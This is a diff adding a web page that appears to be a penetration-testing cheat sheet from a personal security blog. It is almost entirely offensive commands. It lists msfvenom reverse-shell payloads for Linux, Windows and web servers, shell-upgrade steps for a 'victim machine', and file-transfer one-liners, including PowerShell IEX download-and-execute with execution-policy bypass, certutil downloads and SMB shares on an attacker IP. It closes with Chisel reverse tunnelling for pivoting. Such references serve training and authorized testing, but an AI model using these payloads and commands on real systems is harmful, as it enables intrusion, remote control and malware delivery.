+msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f elf &gt; shell
+
+# Windows reverse shell - Staged
+msfvenom -p windows/shell/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f exe -o reverse.exe
+# Windows reverse shell - Stageless
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f exe -o reverse.exe
+</code></pre>
+<h4 id="web">Web</h4>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># PHP
+msfvenom -p php/reverse_php 
+
+# ASPX
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f aspx -o shell.aspx
+
+# JSP
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f raw -o shell.jsp
+
+# WAR
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f war -o shell.war
+</code></pre>
+<h4 id="shellcode">Shellcode</h4>
+<p>Select appropriate architecture</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># Linux Staged - use python or c
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f python
+# Linux Stageless - use python or c
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f python
+
+# Windows Staged - use python or c
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f python
+# Windows Stageless - use python or c
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f python
+</code></pre>
+<h2 id="upgrading-your-shell---linux">Upgrading your shell - Linux</h2>
+<p><em>Upon initial access, it is crucial to achieve the highest functional shell possible for privesc purposes!</em></p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># On victim machine
+which python[3]
+python[3] -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+# background the listener using ctrl+z
+stty -a # notice the number of rows and columns
+stty raw -echo
+# foreground the process: type fg, press enter
+stty rows xx
+stty columns xxx
+export TERM=xterm-256color
+</code></pre>
+<h3 id="escaping-jailed-shells">Escaping jailed Shells</h3>
+<p>Go <a href="/jailbreak" target="_blank">here</a></p>
+<h2 id="file-transfers">File Transfers</h2>
+<h3 id="server">Server</h3>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># HTTP - Apache2
+# cp file /var/www/html/file_name
+sudo service apache2 start
+
+# HTTP - Python. Default port 8000
+# python2
+sudo python -m SimpleHTTPServer 80
+# python3
+sudo python3 -m http.server 80
+
+# SMB
+sudo impacket-smbserver &lt;share_name&gt; &lt;path/to/share&gt;
+
+# FTP
+# apt-get install python-pyftpdlib
+sudo python -m pyftpdlib -p 21
+
+# TFTP (UDP)
+sudo atftpd --daemon -port 69 /path/to/serve
+
+# Netcat
+nc -nvlp &lt;port&gt; &lt; file/to/send
+</code></pre>
+<h3 id="linux---http">Linux - HTTP</h3>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># Wget
+wget http://&lt;ip&gt;/file_name -O /path/to/save/file
+
+# Netcat
+nc -nv &lt;ip&gt; &lt;port&gt; &gt; file/to/recv
+
+# cURL
+curl http://&lt;ip&gt;/file_name --output file_name
+</code></pre>
+<h3 id="windows-1">Windows</h3>
+<ul>
+<li>HTTP</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell"># Does not save file on the system
+powershell.exe -nop -ep bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString('http://&lt;ip&gt;/&lt;file_name&gt;')&quot;
+# Saves file on the system
+powershell.exe -nop -ep bypass -c &quot;iwr -uri http://&lt;ip&gt;/&lt;file_name&gt; -outfile path/to/save/file_name&quot;
+powershell.exe -nop -ep bypass -c &quot;IEX(New-Object Net.WebClient).DownloadFile('http://&lt;ip&gt;/&lt;file_name&gt;','path/to/save/file_name')&quot;
+
+certutil.exe -urlcache -split -f http://&lt;ip&gt;/file file_save
+</code></pre>
+<pre  class="mc-prism hide language-text" ><code>* Wget.ps1
+</code></pre>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">echo $storageDir = $pwd &gt;&gt; wget.ps1
+$webclient = New-Object System.Net.WebClient &gt;&gt; wget.ps1
+# Download file from
+$url = &quot;http://&lt;ip&gt;/file_name&quot; &gt;&gt; wget.ps1
+# Save file as
+$file = &quot;file_name&quot;
+echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1
+# execute the script as follows
+powershell.exe -nop -ep bypass -nol -noni -f wget.ps1
+</code></pre>
+<ul>
+<li>TFTP (UDP)</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">tftp -i &lt;ip&gt; get file_name
+</code></pre>
+<ul>
+<li>SMB</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell"># cmd.exe
+net use Z: \\&lt;attacker_ip&gt;\share_name
+# To access the drive
+Z:
+# PowerShell
+New-PSDrive -Name &quot;notmalicious&quot; -PSProvider &quot;FileSystem&quot; -Root &quot;\\attacker_ip\share_name&quot;
+# To access the drive
+notmalicious:
+</code></pre>
+<ul>
+<li>FTP</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-powershell">ftp &lt;ip&gt;
+ftp&gt;binary
+ftp&gt;get file_name
+
+# One-liner downloader
+# in cmd.exe do not use quotes in an echo command
+echo open &lt;ip&gt; &gt;&gt; download.txt
+echo anonymous &gt;&gt; download.txt
+echo anon &gt;&gt; download.txt
+echo binary &gt;&gt; download.txt
+get file_name &gt;&gt; download.txt
+bye &gt;&gt; download.txt
+ftp -s:download.txt
+</code></pre>
+<h2 id="port-forwarding">Port Forwarding</h2>
+<h3 id="linux-1">Linux</h3>
+<ul>
+<li>Local port forwarding</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">ssh &lt;gateway&gt; -L &lt;local_port_to_listen_to&gt;:&lt;remote_host&gt;:&lt;remote_port&gt;
+</code></pre>
+<ul>
+<li>Remote port forwarding</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">ssh &lt;gateway&gt; -R &lt;remote_port&gt;:&lt;local_host&gt;:&lt;local_port&gt;
+</code></pre>
+<ul>
+<li>Dynamic port forwarding</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">ssh -D &lt;local proxy port&gt; -p &lt;remote port&gt; &lt;target&gt;
+</code></pre>
+<h3 id="windows-2">Windows</h3>
+<p>Chisel is a port forwarding tool for Linux as well as Windows, works over HTTP and can be found <a href="https://github.com/jpillora/chisel">here</a>.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># On KALI
+./chisel server --reverse --port 9001
+# On Windows
+.\chisel.exe client KALI_IP:9001 R:KALI_PORT:127.0.0.1:WINDOWS_PORT
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="windows-3">Windows</h3>
+<p>Local enumeration + privilege escalation available <a href="/privesc-windows/" target="_blank">here</a></p>
+<h3 id="linux-2">Linux</h3>
+<p>Local enumeration + privilege escalation available <a href="/privesc-linux/" target="_blank">here</a></p>
+
+</article>
+</div>
+
+
+                
+                    <div class="content-margin">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "n00bsec" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+                
+            </div>
+<footer>
+    <article>Made with love...and copious amounts of coffee</article>
+</footer>
+
+</main>
+    </body>
+</html>
